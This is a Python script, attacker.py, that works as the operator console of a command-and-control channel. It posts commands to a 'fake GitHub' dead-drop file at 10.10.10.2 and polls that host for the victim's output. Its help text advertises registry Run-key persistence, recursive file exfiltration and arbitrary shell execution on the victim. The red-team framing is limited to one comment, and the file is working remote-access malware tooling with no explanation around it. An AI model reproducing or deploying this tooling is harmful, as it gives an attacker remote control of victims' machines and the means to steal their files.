#!/usr/bin/env python3
# attacker.py

import os
import time
import requests

# Base URL for your fake GitHub (ensure this matches your victim)
FAKE_GITHUB_BASE = "http://10.10.10.2/fake-github"
COMMANDS_URL     = FAKE_GITHUB_BASE + "/Commands.txt"
OUTPUT_URL       = FAKE_GITHUB_BASE + "/Output.txt"

# Usage instructions for Red Team operators
def print_usage():
    usage = r"""
Available commands:
  persist               - install persistence on victim (HKCU Run key)
  upload <filename>     - instruct victim to upload a specific file from its cwd
  get <path>            - instruct victim to upload a file or directory recursively (Working)
  <any other shell cmd> - executed on victim shell, with output returned
  localdir              - show attacker script's current working directory
  help                  - show this usage guide

Examples:
  persist
  upload secrets.txt
  get C:\Users\Public\Documents
  whoami
  dir C:\Windows\System32
  localdir
"""
    print(usage)


def fetch_output():
    """Fetch the output from Output.txt, bypassing caches."""
    try:
        resp = requests.get(OUTPUT_URL, params={'_': time.time()}, headers={'Cache-Control': 'no-cache'})
        print(f"→ {resp.request.method} {resp.url} ← {resp.status_code} {resp.reason}")
        if resp.status_code < 300:
            return resp.text.strip()
        else:
            print("Unexpected status on GET output:", resp.status_code)
    except Exception as e:
        print("Error fetching output:", e)
    return None


def upload_command(command):
    """Upload a new command via HTTP PUT and log everything."""
    try:
        resp = requests.put(COMMANDS_URL, data=command)
        print(f"→ {resp.request.method} {resp.url} ← {resp.status_code} {resp.reason}")
        if 200 <= resp.status_code < 300:
            print("Command uploaded successfully.")
        else:
            print("Unexpected status on PUT command:", resp.status_code)
    except Exception as e:
        print("Error uploading command:", e)


def main():
    last_output = None
    print("Attacker interface started.")
    print_usage()

    while True:
        # Poll the Output.txt file for changes
        current_output = fetch_output()
        if current_output is not None and current_output != last_output:
            print("\n--- New Output ---")
            print(current_output)
            last_output = current_output

        # Prompt for new command
        new_command = input("\nEnter a new command (or 'help'): ").strip()
        if not new_command:
            # Just polling
            time.sleep(1)
            continue

        cmd_low = new_command.lower()
        if cmd_low == 'help':
            print_usage()
        elif cmd_low == 'localdir':
            print(f"Attacker working directory: {os.getcwd()}")
        else:
            upload_command(new_command)

        # Pause before polling again
        time.sleep(1)

if __name__ == "__main__":
    main()
